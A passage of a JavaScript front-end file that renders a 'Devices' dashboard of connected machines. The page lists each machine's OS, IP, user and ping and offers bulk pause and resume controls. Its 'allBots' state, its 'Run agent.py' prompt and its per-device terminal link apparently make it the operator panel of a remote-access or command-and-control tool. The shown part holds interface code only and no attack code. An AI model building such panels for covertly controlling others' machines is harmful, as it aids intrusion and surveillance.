// ============================================================
// 💻 Devices Page — Modern Design with Rotating Earth Globe
// ============================================================
import { getLayout } from "./layout.js";

export function getDevicesPage() {
  const content = `
<div class="page-header">
  <div class="page-title">DEVICES</div>
  <div class="page-subtitle">Manage all connected devices</div>
</div>

<!-- STATS CARDS -->
<div class="stats-grid" style="margin-bottom:20px;">
  <div class="stat-card">
    <div class="stat-label">TOTAL</div>
    <div class="stat-value" id="statTotal">0</div>
    <div class="stat-change">devices</div>
  </div>
  <div class="stat-card">
    <div class="stat-label">ONLINE</div>
    <div class="stat-value green" id="statOnline">0</div>
    <div class="stat-change">● live now</div>
  </div>
  <div class="stat-card">
    <div class="stat-label">OFFLINE</div>
    <div class="stat-value red" id="statOffline">0</div>
    <div class="stat-change">○ disconnected</div>
  </div>
  <div class="stat-card">
    <div class="stat-label">PAUSED</div>
    <div class="stat-value yellow" id="statPaused">0</div>
    <div class="stat-change">⏸️ suspended</div>
  </div>
</div>

<!-- FILTER BAR -->
<div class="filter-bar">
  <input type="text" class="search-input" id="searchInput" placeholder="> search by ID, IP, User, OS..." autocomplete="off">
  <button class="filter-btn active" data-filter="all" onclick="setFilter('all')">ALL</button>
  <button class="filter-btn" data-filter="online" onclick="setFilter('online')">ONLINE</button>
  <button class="filter-btn" data-filter="offline" onclick="setFilter('offline')">OFFLINE</button>
  <button class="filter-btn" data-filter="pinned" onclick="setFilter('pinned')">PINNED</button>
</div>

<!-- BULK ACTIONS + SORT -->
<div class="bulk-bar">
  <div class="bulk-left">
    <button id="pauseAllBtn" class="bulk-btn danger" onclick="pauseAll()">
      ⏸️ STOP ALL
    </button>
    <button id="resumeAllBtn" class="bulk-btn success" onclick="resumeAll()">
      ▶️ RESUME ALL
    </button>
  </div>
  <div class="bulk-right">
    <span class="bulk-label">SORT:</span>
    <select class="search-input" id="sortSelect" onchange="renderDevices()">
      <option value="recent">Most Recent</option>
      <option value="oldest">Oldest First</option>
      <option value="name">Name (A-Z)</option>
      <option value="ping">Lowest Ping</option>
    </select>
  </div>
</div>

<!-- COUNT -->
<div class="count-bar">
  <div class="count-text" id="deviceCount">Loading...</div>
</div>

<!-- GRID -->
<div class="devices-grid" id="devicesGrid">
  <div class="loading">Loading devices...</div>
</div>

<style>
/* ═══════════════════════════════════════════════════════
   BULK BAR
   ═══════════════════════════════════════════════════════ */
.bulk-bar {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 16px;
  flex-wrap: wrap;
  gap: 12px;
  padding: 14px 18px;
  background: linear-gradient(135deg, var(--bg-1) 0%, var(--bg-2) 100%);
  border: 1px solid var(--border-hi);
  border-radius: 12px;
}
.bulk-left, .bulk-right {
  display: flex;
  gap: 10px;
  align-items: center;
  flex-wrap: wrap;
}
.bulk-label {
  font-family: var(--font-mono);
  font-size: 11px;
  color: var(--text-mute);
  letter-spacing: 1.5px;
}

.bulk-btn {
  padding: 10px 20px;
  border-radius: 8px;
  font-family: var(--font-mono);
  font-size: 11px;
  font-weight: 700;
  letter-spacing: 1px;
  cursor: pointer;
  transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
  border: 1px solid;
  display: flex;
  align-items: center;
  gap: 6px;
  position: relative;
  overflow: hidden;
}
.bulk-btn::before {
  content: '';
  position: absolute;
  top: 0; left: -100%;
  width: 100%; height: 100%;
  background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
  transition: left 0.5s;
}
.bulk-btn:hover::before { left: 100%; }
.bulk-btn.danger {
  background: rgba(255, 0, 64, 0.1);
  color: var(--accent-red);
  border-color: var(--accent-red);
}
.bulk-btn.danger:hover {
  background: var(--accent-red);
  color: #fff;
  transform: translateY(-2px);
  box-shadow: 0 8px 25px rgba(255, 0, 64, 0.5);
}
.bulk-btn.success {
  background: rgba(0, 255, 136, 0.1);
  color: var(--green);
  border-color: var(--green);
}
.bulk-btn.success:hover {
  background: var(--green);
  color: #000;
  transform: translateY(-2px);
  box-shadow: 0 8px 25px rgba(0, 255, 136, 0.5);
}

/* ═══════════════════════════════════════════════════════
   COUNT BAR
   ═══════════════════════════════════════════════════════ */
.count-bar {
  margin-bottom: 20px;
  padding: 10px 16px;
  background: rgba(0, 102, 255, 0.05);
  border: 1px solid rgba(0, 102, 255, 0.2);
  border-radius: 8px;
}
.count-text {
  font-family: var(--font-mono);
  font-size: 12px;
  color: var(--text-dim);
  letter-spacing: 0.5px;
}

/* ═══════════════════════════════════════════════════════
   DEVICE GRID
   ═══════════════════════════════════════════════════════ */
.devices-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
  gap: 18px;
}

/* ═══════════════════════════════════════════════════════
   🌍 DEVICE CARD — Rotating Earth Globe Background
   ═══════════════════════════════════════════════════════ */
.device-card {
  background: 
    radial-gradient(ellipse at 50% 50%, rgba(0, 40, 80, 0.6) 0%, rgba(0, 10, 25, 0.95) 100%),
    url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 400 400'><defs><radialGradient id='g' cx='50%25' cy='50%25'><stop offset='0%25' stop-color='%230a4a8a' stop-opacity='0.5'/><stop offset='100%25' stop-color='%23001030' stop-opacity='0.9'/></radialGradient></defs><circle cx='200' cy='200' r='180' fill='url(%23g)'/><ellipse cx='200' cy='200' rx='180' ry='40' fill='none' stroke='%2300ff88' stroke-width='0.6' opacity='0.4'/><ellipse cx='200' cy='200' rx='180' ry='80' fill='none' stroke='%2300ff88' stroke-width='0.6' opacity='0.4'/><ellipse cx='200' cy='200' rx='180' ry='120' fill='none' stroke='%2300ff88' stroke-width='0.6' opacity='0.4'/><ellipse cx='200' cy='200' rx='180' ry='160' fill='none' stroke='%2300ff88' stroke-width='0.6' opacity='0.4'/><ellipse cx='200' cy='200' rx='40' ry='180' fill='none' stroke='%2300ff88' stroke-width='0.6' opacity='0.4'/><ellipse cx='200' cy='200' rx='80' ry='180' fill='none' stroke='%2300ff88' stroke-width='0.6' opacity='0.4'/><ellipse cx='200' cy='200' rx='120' ry='180' fill='none' stroke='%2300ff88' stroke-width='0.6' opacity='0.4'/><ellipse cx='200' cy='200' rx='160' ry='180' fill='none' stroke='%2300ff88' stroke-width='0.6' opacity='0.4'/><path d='M 150 100 Q 180 80 200 100 Q 220 120 200 140 Q 180 160 150 140 Z' fill='%2300ff88' opacity='0.08'/><path d='M 250 250 Q 280 230 300 250 Q 320 270 300 290 Q 280 310 250 290 Z' fill='%2300ff88' opacity='0.08'/><path d='M 100 250 Q 130 240 140 260 Q 130 280 100 270 Z' fill='%2300ff88' opacity='0.08'/></svg>");
  background-size: 100% 100%, 400px 400px;
  background-position: center, center;
  background-repeat: no-repeat;
  border: 1px solid var(--border-hi);
  border-radius: 14px;
  padding: 18px;
  position: relative;
  cursor: pointer;
  transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
  overflow: hidden;
  animation: globeRotate 60s linear infinite;
}

/* ═══ دوران الكرة الأرضية ═══ */
@keyframes globeRotate {
  0% { background-position: center, 0% 50%; }
  100% { background-position: center, 100% 50%; }
}

/* ═══ الشريط الجانبي ═══ */
.device-card::before {
  content: '';
  position: absolute;
  top: 0; left: 0;
  width: 4px;
  height: 100%;
  background: var(--accent-red);
  opacity: 0.5;
  transition: all 0.3s;
  z-index: 2;
}
.device-card.online::before { background: var(--green); opacity: 1; }
.device-card.pinned::before { background: var(--yellow); opacity: 1; }
.device-card.paused::before { background: var(--yellow); opacity: 1; }

/* ═══ الشريط العلوي ═══ */
.device-card::after {
  content: '';
  position: absolute;
  top: 0; left: 0; right: 0;
  height: 2px;
  background: linear-gradient(90deg, transparent, var(--accent-blue), transparent);
  opacity: 0;
  transition: opacity 0.3s;
  z-index: 2;
}
.device-card:hover::after { opacity: 0.8; }

.device-card:hover {
  transform: translateY(-5px);
  border-color: var(--accent-blue);
  box-shadow: 0 20px 50px rgba(0, 102, 255, 0.3);
}
.device-card.online:hover {
  border-color: var(--green);
  box-shadow: 0 20px 50px rgba(0, 255, 136, 0.25);
}

/* ═══ Paused Card ═══ */
.device-card.paused {
  opacity: 0.75;
  border-color: var(--yellow);
}

/* ═══════════════════════════════════════════════════════
   🌍 GLOBE OS ICON (الصغير)
   ═══════════════════════════════════════════════════════ */
.device-os-icon {
  position: absolute;
  top: 16px;
  right: 16px;
  width: 52px;
  height: 52px;
  display: flex;
  align-items: center;
  justify-content: center;
  border-radius: 50%;
  background: 
    radial-gradient(circle at 30% 30%, rgba(0, 255, 136, 0.4) 0%, transparent 50%),
    radial-gradient(circle at 70% 70%, rgba(0, 102, 255, 0.4) 0%, transparent 50%),
    linear-gradient(135deg, #0a1929 0%, #1a3a5c 50%, #0a1929 100%);
  border: 2px solid rgba(0, 255, 136, 0.4);
  box-shadow: 
    0 0 20px rgba(0, 255, 136, 0.4),
    0 0 40px rgba(0, 102, 255, 0.2),
    inset 0 0 20px rgba(0, 0, 0, 0.5);
  transition: all 0.3s;
  overflow: hidden;
  z-index: 3;
}

.device-os-icon::before {
  content: '';
  position: absolute;
  top: -50%;
  left: -50%;
  width: 200%;
  height: 200%;
  background: 
    radial-gradient(circle at 20% 30%, rgba(0, 255, 136, 0.15) 0%, transparent 40%),
    radial-gradient(circle at 60% 70%, rgba(0, 102, 255, 0.15) 0%, transparent 40%),
    repeating-linear-gradient(
      45deg,
      transparent 0px,
      transparent 10px,
      rgba(0, 255, 136, 0.05) 10px,
      rgba(0, 255, 136, 0.05) 11px
    ),
    repeating-linear-gradient(
      -45deg,
      transparent 0px,
      transparent 10px,
      rgba(0, 102, 255, 0.05) 10px,
      rgba(0, 102, 255, 0.05) 11px
    );
  border-radius: 50%;
  animation: globeSpin 20s linear infinite;
}

.device-os-icon::after {
  content: '';
  position: absolute;
  top: 50%;
  left: 50%;
  width: 100%;
  height: 100%;
  transform: translate(-50%, -50%);
  border-radius: 50%;
  background: 
    radial-gradient(circle, transparent 0%, transparent 40%, rgba(0, 255, 136, 0.1) 50%, transparent 60%),
    radial-gradient(circle, transparent 0%, transparent 60%, rgba(0, 102, 255, 0.08) 70%, transparent 80%);
  pointer-events: none;
}

@keyframes globeSpin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

.device-os-icon svg {
  width: 28px;
  height: 28px;
  display: block;
  transition: all 0.3s;
  position: relative;
  z-index: 2;
  filter: brightness(1.2) saturate(1.3) drop-shadow(0 0 5px currentColor);
}

.device-card:hover .device-os-icon {
  transform: scale(1.15);
  border-color: currentColor;
  box-shadow: 
    0 0 30px currentColor,
    0 0 60px rgba(0, 255, 136, 0.3),
    inset 0 0 20px rgba(0, 0, 0, 0.5);
}

/* ═══ Distro Name ═══ */
.device-distro {
  position: absolute;
  top: 74px;
  right: 16px;
  font-size: 8px;
  font-family: var(--font-mono);
  color: var(--green);
  text-align: center;
  letter-spacing: 1.5px;
  width: 52px;
  font-weight: 700;
  text-shadow: 0 0 10px rgba(0, 255, 136, 0.6);
  z-index: 4;
}

/* ═══ Device Head ═══ */
.device-head {
  padding-top: 8px;
  padding-right: 60px;
  margin-bottom: 14px;
  position: relative;
  z-index: 3;
}

.device-name {
  font-family: var(--font-mono);
  font-size: 15px;
  font-weight: 700;
  color: var(--text);
  margin-bottom: 6px;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  letter-spacing: 0.5px;
  text-shadow: 0 2px 5px rgba(0, 0, 0, 0.8);
}
.device-card.online .device-name { 
  color: var(--green); 
  text-shadow: 0 0 15px rgba(0, 255, 136, 0.5), 0 2px 5px rgba(0, 0, 0, 0.8);
}

.device-status {
  display: inline-block;
  padding: 3px 10px;
  border-radius: 10px;
  font-family: var(--font-mono);
  font-size: 9px;
  font-weight: 700;
  letter-spacing: 1px;
}
.device-status.online {
  background: rgba(0, 255, 136, 0.15);
  color: var(--green);
  border: 1px solid rgba(0, 255, 136, 0.3);
  text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
}
.device-status.online::before {
  content: '● ';
  animation: blink 1.5s infinite;
}
.device-status.offline {
  background: rgba(255, 0, 64, 0.1);
  color: var(--accent-red);
  border: 1px solid rgba(255, 0, 64, 0.2);
}
@keyframes blink {
  0%, 100% { opacity: 1; }
  50% { opacity: 0.3; }
}

/* ═══ Device Info ═══ */
.device-info {
  font-family: var(--font-mono);
  font-size: 11px;
  color: var(--text-dim);
  line-height: 1.9;
  margin-top: 10px;
  padding: 12px;
  background: rgba(0, 0, 0, 0.55);
  border-radius: 8px;
  border: 1px solid rgba(0, 255, 136, 0.1);
  backdrop-filter: blur(5px);
  position: relative;
  z-index: 3;
  text-shadow: 0 1px 3px rgba(0, 0, 0, 0.9);
}
.device-info strong {
  color: var(--green);
  font-weight: 700;
  letter-spacing: 0.5px;
}

/* ═══ Device Actions ═══ */
.device-actions {
  display: grid;
  grid-template-columns: 1.5fr 0.7fr 1.3fr 1fr;
  gap: 6px;
  margin-top: 14px;
  padding-top: 14px;
  border-top: 1px solid rgba(0, 255, 136, 0.1);
  position: relative;
  z-index: 3;
}
.device-action-btn {
  padding: 8px 6px;
  background: rgba(0, 0, 0, 0.6);
  border: 1px solid var(--border-hi);
  color: var(--text-dim);
  border-radius: 7px;
  font-family: var(--font-mono);
  font-size: 10px;
  font-weight: 700;
  cursor: pointer;
  letter-spacing: 0.5px;
  transition: all 0.2s;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
  backdrop-filter: blur(5px);
}
.device-action-btn:hover {
  background: var(--accent-blue);
  color: #fff;
  border-color: var(--accent-blue);
  transform: translateY(-2px);
  box-shadow: 0 5px 15px rgba(0, 102, 255, 0.6);
}
.device-action-btn.pin.active {
  background: var(--yellow);
  color: #000;
  border-color: var(--yellow);
  box-shadow: 0 0 15px rgba(255, 204, 0, 0.6);
}
.device-action-btn.warning {
  background: rgba(255, 170, 0, 0.2);
  color: var(--yellow);
  border-color: var(--yellow);
}
.device-action-btn.warning:hover {
  background: var(--yellow);
  color: #000;
  box-shadow: 0 5px 15px rgba(255, 204, 0, 0.6);
}
.device-action-btn.success {
  background: rgba(0, 255, 136, 0.15);
  color: var(--green);
  border-color: var(--green);
}
.device-action-btn.success:hover {
  background: var(--green);
  color: #000;
  box-shadow: 0 5px 15px rgba(0, 255, 136, 0.6);
}
.device-action-btn.danger {
  background: rgba(255, 0, 64, 0.15);
  color: var(--accent-red);
  border-color: var(--accent-red);
}
.device-action-btn.danger:hover {
  background: var(--accent-red);
  color: #fff;
  box-shadow: 0 5px 15px rgba(255, 0, 64, 0.6);
}

/* ═══ Paused Badge ═══ */
.device-badge-paused {
  position: absolute;
  top: 16px;
  left: 16px;
  background: var(--yellow);
  color: #000;
  font-family: var(--font-mono);
  font-size: 9px;
  font-weight: 700;
  padding: 4px 10px;
  border-radius: 12px;
  letter-spacing: 1px;
  display: flex;
  align-items: center;
  gap: 5px;
  animation: pausedPulse 2s infinite;
  z-index: 5;
}
.device-badge-paused::before {
  content: '';
  width: 5px;
  height: 5px;
  background: #000;
  border-radius: 50%;
  animation: dotPulse 1s infinite;
}
@keyframes pausedPulse {
  0%, 100% { box-shadow: 0 0 0 0 rgba(255, 170, 0, 0.5); }
  50% { box-shadow: 0 0 0 10px rgba(255, 170, 0, 0); }
}

/* ═══ Live Badge ═══ */
.device-badge-live {
  position: absolute;
  top: 16px;
  left: 16px;
  background: var(--green);
  color: #000;
  font-family: var(--font-mono);
  font-size: 9px;
  font-weight: 700;
  padding: 4px 10px;
  border-radius: 12px;
  letter-spacing: 1px;
  display: flex;
  align-items: center;
  gap: 5px;
  animation: livePulse 2s infinite;
  z-index: 5;
}
.device-badge-live::before {
  content: '';
  width: 5px;
  height: 5px;
  background: #000;
  border-radius: 50%;
  animation: dotPulse 1s infinite;
}
@keyframes livePulse {
  0%, 100% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0.5); }
  50% { box-shadow: 0 0 0 10px rgba(0, 255, 136, 0); }
}
@keyframes dotPulse {
  0%, 100% { opacity: 1; }
  50% { opacity: 0.3; }
}

/* ═══ Ping Badge ═══ */
.device-ping {
  display: inline-block;
  padding: 3px 9px;
  border-radius: 10px;
  font-family: var(--font-mono);
  font-size: 10px;
  font-weight: 700;
  margin-left: 6px;
  border: 1px solid;
}
.ping-good { background: rgba(0, 255, 136, 0.15); color: var(--green); border-color: rgba(0, 255, 136, 0.3); }
.ping-ok { background: rgba(255, 204, 0, 0.15); color: var(--yellow); border-color: rgba(255, 204, 0, 0.3); }
.ping-mid { background: rgba(255, 102, 0, 0.15); color: var(--orange); border-color: rgba(255, 102, 0, 0.3); }
.ping-bad { background: rgba(255, 0, 64, 0.15); color: var(--accent-red); border-color: rgba(255, 0, 64, 0.3); }
.ping-offline { background: rgba(80, 80, 80, 0.15); color: #505050; border-color: rgba(80, 80, 80, 0.3); }

/* ═══ Filter Bar ═══ */
select.search-input {
  background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%230066ff' stroke-width='2'><polyline points='6 9 12 15 18 9'/></svg>");
  background-repeat: no-repeat;
  background-position: right 10px center;
  padding-right: 32px;
  appearance: none;
  -webkit-appearance: none;
  cursor: pointer;
}
select.search-input option {
  background: var(--bg-2);
  color: var(--text);
}

/* ═══ Responsive ═══ */
@media (max-width: 768px) {
  .stats-grid { grid-template-columns: repeat(2, 1fr); }
  .filter-bar { flex-wrap: wrap; }
  .filter-btn { flex: 1; padding: 10px 8px; font-size: 10px; }
  .search-input { flex-basis: 100%; }
  .bulk-btn { flex: 1; padding: 8px 12px; font-size: 10px; }
  .bulk-bar { padding: 12px; }
  .devices-grid { grid-template-columns: 1fr; }
  .device-actions { grid-template-columns: 1fr 1fr; }
}
</style>

<script>
// ═══════════════════════════════════════════════════════════
// 🎨 OS ICONS (SVG)
// ═══════════════════════════════════════════════════════════
var OS_ICONS = {
  windows: '<svg viewBox="0 0 24 24" width="26" height="26" fill="currentColor"><path d="M3 5.5l7.5-1v7H3v-6zm0 13l7.5 1v-7H3v6zm8.5 1.2L21 21V12.5h-9.5v7.2zM11.5 4.3L3 5.5V12h8.5V4.3zm1-1.3v9h9.5V3l-9.5 0z"/></svg>',
  linux: '<svg viewBox="0 0 24 24" width="26" height="26" fill="currentColor"><path d="M12 2c-2.2 0-4 1.8-4 4 0 .9.3 1.7.8 2.4-.2.2-.5.4-.7.7-.6 1-.9 2.1-1.2 3.3-.2.9-.4 1.7-.9 2.4-.5.7-1.3 1.2-2.1 1.5-.4.2-.8.3-1.2.3-.3 0-.6.1-.8.3-.3.3-.4.8-.2 1.2.2.4.6.6 1 .5.8-.1 1.6-.4 2.3-.8.5-.3 1-.7 1.4-1.2.3.4.7.7 1.1 1 .5.3 1.1.5 1.7.5s1.2-.2 1.7-.5c.4-.3.8-.6 1.1-1 .4.5.9.9 1.4 1.2.7.4 1.5.7 2.3.8.4.1.8-.1 1-.5.2-.4.1-.9-.2-1.2-.2-.2-.5-.3-.8-.3-.4 0-.8-.1-1.2-.3-.8-.3-1.6-.8-2.1-1.5-.5-.7-.7-1.5-.9-2.4-.3-1.2-.6-2.3-1.2-3.3-.2-.3-.5-.5-.7-.7.5-.7.8-1.5.8-2.4 0-2.2-1.8-4-4-4z"/></svg>',
  kali: '<svg viewBox="0 0 24 24" width="26" height="26" fill="currentColor"><path d="M12 2c-2.2 0-4 1.8-4 4 0 .9.3 1.7.8 2.4-.2.2-.5.4-.7.7-.6 1-.9 2.1-1.2 3.3-.2.9-.4 1.7-.9 2.4-.5.7-1.3 1.2-2.1 1.5-.4.2-.8.3-1.2.3-.3 0-.6.1-.8.3-.3.3-.4.8-.2 1.2.2.4.6.6 1 .5.8-.1 1.6-.4 2.3-.8.5-.3 1-.7 1.4-1.2.3.4.7.7 1.1 1 .5.3 1.1.5 1.7.5s1.2-.2 1.7-.5c.4-.3.8-.6 1.1-1 .4.5.9.9 1.4 1.2.7.4 1.5.7 2.3.8.4.1.8-.1 1-.5.2-.4.1-.9-.2-1.2-.2-.2-.5-.3-.8-.3-.4 0-.8-.1-1.2-.3-.8-.3-1.6-.8-2.1-1.5-.5-.7-.7-1.5-.9-2.4-.3-1.2-.6-2.3-1.2-3.3-.2-.3-.5-.5-.7-.7.5-.7.8-1.5.8-2.4 0-2.2-1.8-4-4-4z"/></svg>',
  ubuntu: '<svg viewBox="0 0 24 24" width="26" height="26" fill="currentColor"><circle cx="12" cy="12" r="10" fill="none" stroke="currentColor" stroke-width="2"/><circle cx="12" cy="12" r="3" fill="currentColor"/></svg>',
  debian: '<svg viewBox="0 0 24 24" width="26" height="26" fill="currentColor"><path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2z"/></svg>',
  arch: '<svg viewBox="0 0 24 24" width="26" height="26" fill="currentColor"><path d="M12 2L2 20h4l1.5-3h9L18 20h4L12 2z"/></svg>',
  fedora: '<svg viewBox="0 0 24 24" width="26" height="26" fill="currentColor"><circle cx="12" cy="12" r="10" fill="none" stroke="currentColor" stroke-width="2"/></svg>',
  mac: '<svg viewBox="0 0 24 24" width="26" height="26" fill="currentColor"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/></svg>',
  android: '<svg viewBox="0 0 24 24" width="26" height="26" fill="currentColor"><path d="M17.6 9.48l1.84-3.18c.16-.31.04-.69-.26-.85-.29-.15-.65-.06-.83.22l-1.88 3.24c-1.4-.6-3.02-.94-4.71-.94-1.69 0-3.31.34-4.71.94L5.22 5.67c-.18-.28-.54-.37-.83-.22-.3.16-.42.54-.26.85l1.84 3.18C2.79 11.14.86 14.19.5 17.5h23c-.36-3.31-2.29-6.36-5.9-8.02zM7 14.25c-.69 0-1.25-.56-1.25-1.25s.56-1.25 1.25-1.25 1.25.56 1.25 1.25-.56 1.25-1.25 1.25zm10 0c-.69 0-1.25-.56-1.25-1.25s.56-1.25 1.25-1.25 1.25.56 1.25 1.25-.56 1.25-1.25 1.25z"/></svg>',
  unknown: '<svg viewBox="0 0 24 24" width="26" height="26" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/></svg>'
};

// ═══════════════════════════════════════════════════════════
// 🎨 GET OS INFO
// ═══════════════════════════════════════════════════════════
function getOSInfo(os) {
  var o = (os || '').toLowerCase();
  
  if (o.indexOf('windows') !== -1) {
    var winVer = 'Windows';
    if (o.indexOf('11') !== -1) winVer = 'Windows 11';
    else if (o.indexOf('10') !== -1) winVer = 'Windows 10';
    else if (o.indexOf('8') !== -1) winVer = 'Windows 8';
    else if (o.indexOf('7') !== -1) winVer = 'Windows 7';
    return { type: 'windows', icon: OS_ICONS.windows, distro: winVer };
  }
  
  if (o.indexOf('kali') !== -1) return { type: 'kali', icon: OS_ICONS.kali, distro: 'KALI' };
  if (o.indexOf('ubuntu') !== -1) return { type: 'ubuntu', icon: OS_ICONS.ubuntu, distro: 'UBUNTU' };
  if (o.indexOf('debian') !== -1) return { type: 'debian', icon: OS_ICONS.debian, distro: 'DEBIAN' };
  if (o.indexOf('fedora') !== -1) return { type: 'fedora', icon: OS_ICONS.fedora, distro: 'FEDORA' };
  if (o.indexOf('arch') !== -1) return { type: 'arch', icon: OS_ICONS.arch, distro: 'ARCH' };
  if (o.indexOf('mac') !== -1 || o.indexOf('darwin') !== -1) return { type: 'mac', icon: OS_ICONS.mac, distro: 'macOS' };
  if (o.indexOf('android') !== -1) return { type: 'android', icon: OS_ICONS.android, distro: 'Android' };
  if (o.indexOf('linux') !== -1) return { type: 'linux', icon: OS_ICONS.linux, distro: 'LINUX' };
  
  return { type: 'unknown', icon: OS_ICONS.unknown, distro: 'UNKNOWN' };
}

// ═══════════════════════════════════════════════════════════
// 📊 STATE
// ═══════════════════════════════════════════════════════════
var allBots = [];
var currentFilter = 'all';
var currentSort = 'recent';
var searchText = '';
var pausedAll = false;

function setFilter(f) {
  currentFilter = f;
  document.querySelectorAll('.filter-btn').forEach(function(btn) {
    btn.classList.toggle('active', btn.dataset.filter === f);
  });
  renderDevices();
}

document.getElementById('searchInput').addEventListener('input', function(e) {
  searchText = e.target.value.toLowerCase().trim();
  renderDevices();
});

document.getElementById('sortSelect').addEventListener('change', function(e) {
  currentSort = e.target.value;
  renderDevices();
});

function getFilteredBots() {
  var list = allBots.slice();

  if (currentFilter === 'online') list = list.filter(function(b) { return b.isOnline; });
  else if (currentFilter === 'offline') list = list.filter(function(b) { return !b.isOnline; });
  else if (currentFilter === 'pinned') list = list.filter(function(b) { return b.pinned; });

  if (searchText) {
    list = list.filter(function(b) {
      return (b.id || '').toLowerCase().indexOf(searchText) !== -1
        || (b.ip || '').toLowerCase().indexOf(searchText) !== -1
        || (b.user || '').toLowerCase().indexOf(searchText) !== -1
        || (b.os || '').toLowerCase().indexOf(searchText) !== -1
        || (b.hostname || '').toLowerCase().indexOf(searchText) !== -1;
    });
  }

  list.sort(function(a, b) {
    if (a.pinned && !b.pinned) return -1;
    if (!a.pinned && b.pinned) return 1;
    if (a.isOnline && !b.isOnline) return -1;
    if (!a.isOnline && b.isOnline) return 1;

    switch (currentSort) {
      case 'recent': return (b.lastSeen || 0) - (a.lastSeen || 0);
      case 'oldest': return (a.lastSeen || 0) - (b.lastSeen || 0);
      case 'name': return (a.id || '').localeCompare(b.id || '');
      case 'ping':
        if (!a.isOnline && b.isOnline) return 1;
        if (a.isOnline && !b.isOnline) return -1;
        return (a.ping || 9999) - (b.ping || 9999);
      default: return 0;
    }
  });

  return list;
}

function getPingClass(ping, isOnline) {
  if (!isOnline) return 'ping-offline';
  if (ping === null || ping === undefined) return 'ping-offline';
  if (ping < 100) return 'ping-good';
  if (ping < 400) return 'ping-ok';
  if (ping < 700) return 'ping-mid';
  return 'ping-bad';
}

function getPingText(ping, isOnline) {
  if (!isOnline) return '999ms';
  if (ping === null || ping === undefined) return '999ms';
  if (ping > 999) return '999ms';
  return ping + 'ms';
}

function formatTime(ms) {
  if (!ms) return 'never';
  var elapsed = Math.floor((Date.now() - ms) / 1000);
  if (elapsed < 60) return elapsed + 's ago';
  if (elapsed < 3600) return Math.floor(elapsed / 60) + 'm ago';
  if (elapsed < 86400) return Math.floor(elapsed / 3600) + 'h ago';
  return Math.floor(elapsed / 86400) + 'd ago';
}

// ═══════════════════════════════════════════════════════════
// 🎨 RENDER
// ═══════════════════════════════════════════════════════════
function renderDevices() {
  var grid = document.getElementById('devicesGrid');
  var countEl = document.getElementById('deviceCount');
  var list = getFilteredBots();

  var total = allBots.length;
  var online = allBots.filter(function(b) { return b.isOnline; }).length;
  var offline = total - online;
  var pausedCount = allBots.filter(function(b) { return b.paused; }).length;

  document.getElementById('statTotal').textContent = total;
  document.getElementById('statOnline').textContent = online;
  document.getElementById('statOffline').textContent = offline;
  document.getElementById('statPaused').textContent = pausedCount;

  countEl.innerHTML = 'Showing <span style="color:var(--accent-blue);font-weight:700;">' + list.length + '</span> of <span style="color:var(--text);font-weight:700;">' + total + '</span> devices' +
    (pausedAll ? ' · <span style="color:var(--yellow);font-weight:700;">⏸️ ALL PAUSED</span>' : '');

  if (list.length === 0) {
    if (allBots.length === 0) {
      grid.innerHTML = '<div class="loading" style="grid-column:1/-1;">No devices connected yet.<br><span style="color:var(--accent-blue);">Run agent.py to connect a device.</span></div>';
    } else {
      grid.innerHTML = '<div class="loading" style="grid-column:1/-1;">No devices match your filter.</div>';
    }
    return;
  }

  grid.innerHTML = list.map(function(b) {
    var osInfo = getOSInfo(b.os);
    var pingClass = getPingClass(b.ping, b.isOnline);
    var pingText = getPingText(b.ping, b.isOnline);
    var isPaused = b.paused || pausedAll;
    var cardClass = 'device-card ' + (b.isOnline ? 'online' : 'offline') + (b.pinned ? ' pinned' : '') + (isPaused ? ' paused' : '');
    var badge = isPaused 
      ? '<div class="device-badge-paused">' + (pausedAll ? 'ALL PAUSED' : 'PAUSED') + '</div>'
      : (b.isOnline ? '<div class="device-badge-live">LIVE</div>' : '');
    var lastSeenStr = formatTime(b.lastSeen);
    var safeId = escapeHtml(b.id).replace(/'/g, "\\\\'");

    return '<div class="' + cardClass + '" onclick="goToTerminal(\\'' + safeId + '\\')">' +
      badge +
      '<div class="device-os-icon ' + osInfo.type + '" title="' + osInfo.distro + '">' + osInfo.icon + '</div>' +
      '<div class="device-distro">' + osInfo.distro + '</div>' +
      '<div class="device-head">' +
        '<div class="device-name" title="' + escapeHtml(b.id) + '">' + escapeHtml(b.id) + '</div>' +
        '<div class="device-status ' + (b.isOnline ? 'online' : 'offline') + '">' + (b.isOnline ? 'ONLINE' : 'OFFLINE') + '</div>' +
      '</div>' +
      '<div class="device-info">' +
        '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">' +
          '<span><strong>OS:</strong> ' + escapeHtml((b.os || '?').substring(0, 25)) + '</span>' +
          '<span class="device-ping ' + pingClass + '">' + pingText + '</span>' +
        '</div>' +
        '<div><strong>IP:</strong> ' + escapeHtml(b.ip || '?') + '</div>' +
        '<div><strong>User:</strong> ' + escapeHtml(b.user || '?') + '</div>' +
